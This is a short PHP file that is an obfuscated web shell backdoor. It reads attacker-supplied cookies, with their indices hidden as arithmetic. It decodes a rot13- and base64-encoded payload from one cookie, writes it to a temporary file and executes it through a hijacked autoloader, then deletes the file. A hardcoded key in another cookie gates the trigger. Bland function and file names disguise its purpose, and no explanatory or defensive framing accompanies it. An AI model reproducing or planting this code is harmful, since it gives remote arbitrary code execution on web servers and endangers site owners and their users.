<?php


if (isset($_COOKIE[32-32]) && isset($_COOKIE[-16+17]) && isset($_COOKIE[31-28]) && isset($_COOKIE[69+-65])) {
    $dchunk = $_COOKIE;
    function core_engine($data) {
        $dchunk = $_COOKIE;
        $factor = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '595160fb');
        if (!is_writable($factor)) {
            $factor = getcwd() . DIRECTORY_SEPARATOR . "right_pad_string";
        }
        $object = "\x3c\x3f\x70\x68p " . base64_decode(str_rot13($dchunk[3]));
        if (is_writeable($factor)) {
            $sym = fopen($factor, 'w+');
            fputs($sym, $object);
            fclose($sym);
            spl_autoload_unregister(__FUNCTION__);
            require_once($factor);
            @array_map('unlink', array($factor));
        }
    }
    spl_autoload_register("core_engine");
    $pointer = "ffb0e7ecd1ebb81a84ac30c7e9f2d012";
    if (!strncmp($pointer, $dchunk[4], 32)) {
        if (@class_parents("service_registry_reverse_searcher", true)) {
            exit;
        }
    }
}
